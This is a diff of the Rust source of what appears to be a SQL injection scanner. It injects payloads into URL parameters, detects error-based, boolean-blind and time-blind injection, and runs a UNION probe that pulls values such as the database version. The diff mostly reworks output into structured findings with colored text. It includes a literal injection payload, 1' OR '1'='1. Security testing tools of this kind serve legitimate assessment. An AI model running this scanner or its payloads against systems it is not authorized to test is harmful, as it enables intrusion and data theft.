@@ -1,16 +1,14 @@
 use crate::http;
 use crate::payloads;
-use anyhow::Ok;
-use reqwest::Body;
-use scraper::Html;
-use scraper::Node::Document;
-use scraper::Selector;
-use scraper::selector;
-use serde::de::value;
+//use anyhow::Ok;
+use colored::Colorize;
 use url::Url;
 
 
+
+
 pub fn scan(target_url: &str, cookie: Option<&str>, scan_type: &str) -> anyhow::Result<()>{
+
     let parsed = Url::parse(target_url)?;
     let  params: Vec<(String, String)> = parsed
         .query_pairs()
@@ -41,8 +39,16 @@ pub fn scan(target_url: &str, cookie: Option<&str>, scan_type: &str) -> anyhow::
                 let res = http::get(&injected_url, cookie)?;
          
                 if let Some(db) = super::detector::detect_error_based(&res.body) {
+
+                    let finding = super::detector::Finding{
+                        sqli_type: "Error-based".to_string(),
+                        param: param_name.clone(),
+                        db_type: Some(db),
+                        payload: payload.to_string(),
+                        evidence: format!("SQL error in response body")
+                    };
                     
-                    println!("[VULN] Error-based SQLi | param: {} | DB: {} | payload: {}", param_name,db, payload);
+                    println!("{}", finding);
 
                     let extract_url = replace_param(target_url, param_name, "1' OR '1'='1")?;
                     let extract_res = http::get(&extract_url, cookie)?;
@@ -70,16 +76,22 @@ pub fn scan(target_url: &str, cookie: Option<&str>, scan_type: &str) -> anyhow::
                 let false_res = http::get(&false_url, cookie)?;
         
                 if super::detector::detect_boolean_blind(baseline.body.len(), &true_res.body, &false_res.body) {
-                    println!("[VULN] Boolean-Blind SQLi | param: {} | payload: {}", param_name, true_payload);
-                    println!("   TRUE response:  {}bytes", true_res.body.len());
-                    println!("   FALSE response: {}bytes", false_res.body.len());
-                    println!("   Diff:           {}bytes", (true_res.body.len() as isize - false_res.body.len() as isize).abs());
+
+                    let finding = super::detector::Finding{
+                        sqli_type: "Boolean-Blind".to_string(),
+                        param: param_name.clone(),
+                        db_type: None,
+                        payload: true_payload.to_string(),
+                        evidence: format!("TRUE: {} | False: {} | Diff: {}", true_res.body.len(),false_res.body.len(),(true_res.body.len() as isize - false_res.body.len() as isize).abs())
+                    };
+                    println!("{}", finding);
                     bool_found = true;
                     break;
                 }
             }
             if !bool_found {
-                println!("  Boolean-Blind: not detected");
+                let msg = "  Boolean-Blind: not detected".dimmed();
+                println!("{}", msg);
             }
         }
         if run_time {
@@ -89,10 +101,15 @@ pub fn scan(target_url: &str, cookie: Option<&str>, scan_type: &str) -> anyhow::
                 let res = http::get(&injected_url, cookie)?;
             
                 if super::detector::detect_time_blind(baseline.response_time_ms, res.response_time_ms, 4000) {
-                    println!("[VULN] Time-Blind SQLi | param: {} | DB: {} | payload: {}", param_name, db_type, payload);
-                    println!("  Baseline time:  {}ms", baseline.response_time_ms);
-                    println!("  Injected time:  {}ms", res.response_time_ms);
-                    println!("  Delta:          {}ms", res.response_time_ms - baseline.response_time_ms);
+                    
+                    let finding = super::detector::Finding{
+                        sqli_type: "Time-Blind".to_string(),
+                        param: param_name.clone(),
+                        db_type: Some(db_type.to_string()),
+                        payload: payload.to_string(),
+                        evidence: format!("Baseline: {}ms | Injected: {}ms | Delta: {}ms", baseline.response_time_ms, res.response_time_ms, res.response_time_ms - baseline.response_time_ms),
+                    };
+                    println!("{}", finding);
                     time_found = true;
                     break;
                 }
@@ -105,13 +122,15 @@ pub fn scan(target_url: &str, cookie: Option<&str>, scan_type: &str) -> anyhow::
             probe_union(target_url, param_name, cookie)?;
         }
     }
-    println!("\n============= Scan Complete =============");
+    let msg_finish = "\n============= Scan Complete =============".blue().bold();
+    println!("{}", msg_finish);
     Ok(())
 }
 
 
 fn probe_union(target_url: &str, param_name: &str, cookie: Option<&str>) -> anyhow::Result<()> {
-    println!("  [UNION] step 1: Finding column count...");
+    let msg_step1 = "  [UNION] step 1: Finding column count...".cyan().dimmed();
+    println!("{}", msg_step1);
 
     let mut col_count: u32 = 0;
     for n in 1..=20  {
@@ -128,12 +147,14 @@ fn probe_union(target_url: &str, param_name: &str, cookie: Option<&str>) -> anyh
     }
 
     if col_count == 0 {
-        println!("  [UNION] Could not  determine column count");
+        let det_col = "  [UNION] Could not  determine column count".dimmed();
+        println!("{}", det_col);
         return Ok(());
     }
-    println!("  [UNION] Column count: {}", col_count);
-
-    println!("  [UNION] Step 2: Finding reflection column...");
+    println!("  [UNION] Column count: {}", col_count.to_string().cyan().bold());
+    
+    let msg_step2 = "  [UNION] Step 2: Finding reflection column...".cyan().dimmed();
+    println!("{}", msg_step2);
     let mut reflection_col: Option<u32> = None;
     for pos in 0..col_count  {
         let payload = payloads::union_find_reflection(col_count, pos);
@@ -148,16 +169,17 @@ fn probe_union(target_url: &str, param_name: &str, cookie: Option<&str>) -> anyh
 
     let reflect_pos = match reflection_col {
         Some(pos) => {
-            println!("  [UNION] Reflection found at column: {}", pos + 1);
+            println!("  [UNION] Reflection found at column: {}", (pos + 1).to_string().cyan().bold());
             pos
         }
         None => {
-            println!("  [UNION] No reflection column found");
+            let msg = "  [UNION] No reflection column found ".dimmed();
+            println!("{}", msg);
             return Ok(());
         }
     };
-
-    println!("  [UNION] Step 3: Extracting data...\n");
+    let msg_step3 = "  [UNION] Step 3: Extracting data...\n".cyan().dimmed();
+    println!("{}", msg_step3);
 
     let extractions = vec![
         ("version()", "DB version"),
@@ -171,12 +193,21 @@ fn probe_union(target_url: &str, param_name: &str, cookie: Option<&str>) -> anyh
         let res = http::get(&url, cookie)?;
 
         if let Some(value) = super::detector::extract_value(&res.body) {
-            println!("  {}: {}", label, value);
+            println!("  {}: {}", label.yellow().bold(), value.green());
         }
 
     }
 
-    println!("\n[VULN] UNION-based SQLi | param: {} | columns: {}", param_name, col_count);
+    println!();
+    let union_finding = super::detector::Finding{
+        sqli_type: "UNION-Based".to_string(),
+        param: param_name.to_string(),
+        db_type: None,
+        payload: "(Multi-step)".to_string(),
+        evidence: format!("columns: {}", col_count),
+    };
+
+    println!("{}", union_finding);
     Ok(())
 
 }
@@ -201,5 +232,4 @@ fn replace_param(url_str: &str, param: &str, payload: &str) -> anyhow::Result<St
 
     Ok(parsed.to_string())
 }
-
 
